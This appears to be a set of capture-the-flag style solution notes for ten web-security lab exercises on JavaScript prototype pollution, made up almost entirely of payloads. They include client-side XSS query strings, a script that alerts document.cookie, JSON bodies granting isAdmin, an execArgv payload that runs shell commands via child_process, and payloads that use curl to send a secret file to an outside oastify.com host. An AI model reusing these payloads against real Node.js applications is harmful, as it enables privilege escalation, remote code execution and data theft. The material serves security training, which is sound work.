## 1. Client-side prototype pollution via browser APIs

```
/?__proto__[value]=data:,alert(1);

data:[<media type>][;base64],<data>
```

This will also work `data:application/javascript,alert();`, in script src `application/javascript` is set by default.

## 2. DOM XSS via client-side prototype pollution

```
/?__proto__[transport_url]=data:,alert(1);
```

## 3. DOM XSS via an alternative prototype pollution vector


```
/?__proto__.sequence=);alert(
```

## 4. Client-side prototype pollution via flawed sanitization

```
/?__pro__proto__to__[transport_url]=data:,alert()
```

## 5. Scanning non-standard data structures

```html
<script>
    location="https://0ab600fe04a7f8c88152b16900bb004e.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```


## 6. Privilege escalation via server-side prototype pollution

```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"nGHufYaWkCvezfEZYUwGvWrdP6blmQup",
   "__proto__":{
      "isAdmin":true
   }
}
```


## 7. Detecting server-side prototype pollution without polluted property reflection

```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"qe4dINvBU5R5Rz0pt9O9ZtGoAa8eWgi8",
   "__proto__":{
      "json spaces":" "
   }
}
```

## 8. Bypassing flawed input filters for server-side prototype pollution

```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK1",
   "sessionId":"xEwc8d0PHFUSwN3XLikllHwzEpSYqccn",
   "constructor":{
      "prototype":{
         "isAdmin":true
      }
   }
}
```


## 9. Remote code execution via server-side prototype pollution

```json
POST /my-account/change-address HTTP/2

{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"5gojfKVIjmRUwaG2znvIFf8LAc1IRPeH",
   "__proto__":{
      "isAdmin":true
   }
}
```

```json
POST /my-account/change-address HTTP/2

{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"5gojfKVIjmRUwaG2znvIFf8LAc1IRPeH",
   "__proto__":{
      "execArgv":[
         "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
      ]
   }
}
```

```json
POST /admin/jobs HTTP/2

{
   "csrf":"BGejyzzug1SH0LzmFsdzdeRlQaOuvAHQ",
   "sessionId":"5gojfKVIjmRUwaG2znvIFf8LAc1IRPeH",
   "tasks":[
      "db-cleanup",
      "fs-cleanup"
   ]
}
```


## 10. Exfiltrating sensitive data via server-side prototype pollution

Detection in case eval fails

```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"bNZesQjFZZawevt71JvHjMzpSKwzbRaA",
   "__proto__":{
      "argv0":"node",
      "shell":"node",
      "NODE_OPTIONS":"--inspect=6bi8v0nohyji8gont93nhgi3augm4gs5.oastify.com"
   }
}
```

```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"ZdGdRt2Y5f3hDOgpIx2IwlKcSX0L5tud",
   "__proto__":{
      "shell":"/proc/self/exe",
      "argv0":"console.log(require('child_process').execSync('curl oldq5ix6rgt0iyy53rd5ryslkcq5ew2l.oastify.com').toString())//",
      "NODE_OPTIONS":"--require /proc/self/cmdline"
   }
}
```


```json
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"ZdGdRt2Y5f3hDOgpIx2IwlKcSX0L5tud",
   "__proto__":{
      "shell":"/proc/self/exe",
      "argv0":"console.log(require('child_process').execSync('curl -X POST http://oldq5ix6rgt0iyy53rd5ryslkcq5ew2l.oastify.com -d \"$(cat ./secret)\"').toString())//",
      "NODE_OPTIONS":"--require /proc/self/cmdline"
   }
}
```
